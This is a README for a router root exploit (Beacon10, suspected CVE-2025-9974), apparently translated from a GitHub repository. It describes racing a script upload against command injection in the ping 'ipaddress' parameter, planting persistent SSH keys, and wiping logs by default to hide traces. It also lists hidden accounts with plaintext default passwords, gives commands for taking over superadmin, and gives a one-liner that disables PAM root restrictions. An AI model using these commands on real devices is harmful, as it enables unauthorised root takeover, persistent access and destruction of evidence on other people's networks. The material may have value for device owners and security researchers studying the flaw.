# Beacon10-Getshell

> English translation of [xxs-2/Beacon10-Getshell](https://github.com/xxs-2/Beacon10-Getshell)
> (suspected CVE-2025-9974). Code is unchanged — comments and messages translated.

**This piece of junk wasn't worth 280 to me, and paying 350 for it — forget it.**
The best Beacon10 unlock method money can buy; tested working on 2402b.04.09.A17.
If you can't get it to work, ask your dear DeepSeek — the vulnerable URLs and the
PoC are all in here anyway.
Honestly, this PoC is a bit dumb, but I can't be bothered to fix it — if it runs,
it runs.
The vulnerability only fires while the WAN is connected — i.e. you must be able
to see the WAN after logging in as admin.

## How it works

1. Log in to the WebUI (`login_web_app.cgi`, AES-CBC + RSA-encrypted session).
2. Race two endpoints against each other:
   - `usb_web_app.cgi?v=import&sl_num=usb1_1` — uploads the payload script
     (looped by 2 uploader threads);
   - `troubleshooting_web_app.cgi?ping` — command injection via the `ipaddress`
     parameter (`--help&/bin/sh</tmp/<script>`, looped by 4 injector threads).
3. When the race wins, the uploaded script runs as root, installs an SSH
   public key into `/root/.ssh/authorized_keys` and `/etc/dropbear/authorized_keys`
   (the persistent copy), and a real root shell (`uid=0 gid=0`) is available on
   port 22.
4. Optionally (`--wipe-logs`, on by default) the Web password is rotated and
   `/logs` is overwritten in place to remove traces.

## Usage

```bash
python run.py --host 192.168.12.1 --user admin --password '<admin password>'
# interactive (shows the TLS certificate first); add --yes to skip the prompt
# add --no-wipe-logs to only install the pubkey and leave /logs alone
```

Requires `ssh`/`ssh-keygen` (OpenSSH) on the attacker box; a keypair is
generated automatically. After a successful run:

```bash
ssh -i nokiakey root@192.168.12.1
```

## Hidden accounts (found via root + `cfgcli -a`)

The config database (`cfgcli -a`) holds several accounts beyond the label `admin`
(`InternetGatewayDevice.X_Authentication.Account`, Priority 2):

| Account | Where | Priority | Password storage |
|---|---|---|---|
| `admin` | `X_Authentication.Account` | 2 | `sab`-encrypted (label default) |
| `superadmin` | `X_Authentication.WebAccount` | **1** | `sab`-encrypted, has separate `PresetPassword` |
| `telecomadmin` | `X_CT-COM_TeleComAccount` | — | `sab`-encrypted, **never changed from factory default** |
| `superuser` | `X_Authentication.WebGlobeAccount` | 1 | **plaintext `123456789`** in config |
| `user` | `X_Authentication.GlobeAccount` | 2 | **plaintext `123456789`** in config |

Only `Account` (admin) and `WebAccount` (superadmin) are consulted by
`/webs/login_web_app.cgi`; the others are dormant in this login flow.
`superadmin` is also a Linux account baked into the image (`/usr/etc/passwd`)
with **uid=0, gid=102, shell /bin/ash** — a second root; its factory
SHA-crypt hash lives in `/usr/etc/shadow`.

`sab` is the vendor's AES-256-CBC config-value encryption (key embedded, see
`/usr/sbin/encrypt_client_app`, `ealgo="sab" kn="key11"`); no offline
decryption shortcut was found, and a ~35-word dictionary did not crack the
baked root/superadmin hashes.

**Taking over superadmin (no cracking needed, persistent in flash):**

```bash
cfgcli -s "InternetGatewayDevice.X_Authentication.WebAccount.Password" 'NewSuper@123'
cfgcli --save-flash-now
# then log into the WebUI as superadmin / NewSuper@123 -> {"result":0,"is_ctc_admin":1}
```

`is_ctc_admin:1` in the login response marks carrier-level privileges.
Web login has a per-account failure counter: too many bad attempts give
*"Too many failed attempts, account temporarily locked"* — go easy on
dictionary attempts. Password policy: 8–24 chars from `!#+,-./:=@_` + alnum.

## Enabling root password login (post-root)

Out of the box, root password login over SSH **never works** on this firmware,
even with a correct password. Three things are going on (all verified on
`2402b.04.09.A17`):

1. **PAM blocks root.** The vendor dropbear (v2020.81) is built with PAM, and
   `/etc/security/access.conf` contains:
   ```
   -:root EXCEPT (wheel) :ALL
   ```
   `pam_acct_mgmt()` rejects root with `Permission denied` *before* the password
   is even checked — dropbear logs `Bad PAM password attempt for 'root'`.
   Fix: replace that line with `+ : root : ALL`.

2. **No lockout safety net.** `/etc/pam.d/sshd` includes `pam_faillock` with
   `deny=3 unlock_time=300 even_deny_root` — 3 wrong password attempts lock
   root out for 5 minutes *even with the correct password*. State lives in
   `/var/run/faillock/`; clear it (`: > /var/run/faillock/root`) or wait it out.

3. **The password does not survive a reboot.** `/etc/shadow` is a symlink into
   tmpfs; `/etc/preinit` re-seeds it from the read-only image (`/usr/etc/shadow`)
   at every boot. So the access.conf fix and the password are both session-only
   (until reboot). The only persistent access is the SSH key dropbear reads from
   `/configs/overlay/etc/dropbear/authorized_keys` (persistent ext4 at
   `/configs`).

One-liner to enable password login after getting root (lost on reboot):

```bash
sed -i 's/^-:root EXCEPT (wheel) :ALL/+ : root : ALL/' /etc/security/access.conf
echo 'root:NEWPASS' | chpasswd
: > /var/run/faillock/root
```

Notes:
- `chpasswd`/`passwd` write a SHA-crypt (`$5$`) hash; dropbear's PAM `pam_unix`
  also accepts an MD5 (`$1$`) hash if you edit `/tmp/shadow` directly — beware
  of shell-quoting the `$` characters when doing so over SSH.
- Firewall: LAN input is restricted to port 22 — extra listeners (e.g. a debug
  `dropbear -p 2222`) are unreachable from LAN. Use an SSH port-forward over 22
  for that.
